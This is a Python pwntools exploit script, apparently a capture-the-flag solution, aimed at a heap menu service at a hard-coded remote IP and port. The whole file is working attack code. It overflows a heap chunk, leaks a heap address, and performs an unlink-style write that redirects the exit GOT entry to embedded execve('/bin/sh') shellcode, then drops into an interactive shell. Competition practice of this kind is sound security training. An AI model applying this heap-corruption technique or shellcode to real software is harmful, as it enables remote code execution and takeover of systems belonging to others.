#!/usr/bin/env python
from pwn import *

r = remote('110.10.212.137',3333)
shellcode = '\xeb\x16\x00\x00\x00\x00\x00\x00' + p64(0) + p64(0)
shellcode += '4831d248bbff2f62696e2f736848c1eb08534889e74831c050574889e6b03b0f056a015f6a3c580f05'.decode('hex')

r.recvuntil('>> ')
r.send('L')
r.recvuntil('size : ')
r.send('8 ')
r.recvuntil('msg : ')
r.send('A' * 8)

r.recvuntil('>> ')
r.send('L')
r.recvuntil('size : ')
r.send('8 ')
r.recvuntil('msg : ')
r.send('B' * 8)

r.recvuntil('>> ')
r.send('C')
r.recvuntil('index : ')
r.send('0 ')
r.recvuntil('size : ')
r.send('48 ')
r.recvuntil('msg : ')
r.send('C' * 32)

r.recvuntil('>> ')
r.send('V')
r.recvuntil('index : ')
r.send('0 ')

heap_addr = u32(r.recvuntil('\n[L]')[32:-4].ljust(4,'\x00')) - 0x78
shellcode_addr = heap_addr + 0x30 + 0x40

addr1 = shellcode_addr - 0x10
addr2 = 0x602070 # exit

r.recvuntil('>> ')
r.send('C')
r.recvuntil('index : ')
r.send('0 ')
r.recvuntil('size : ')
r.send('128 ')
r.recvuntil('msg : ')
payload = 'C' * 32 + p64(addr1) + p64(addr2 - 8) + shellcode
r.send(payload.ljust(128))

r.recvuntil('>> ')
r.send('R')
r.recvuntil('index : ')
r.send('1 ')

r.recvuntil('>> ')
r.interactive()
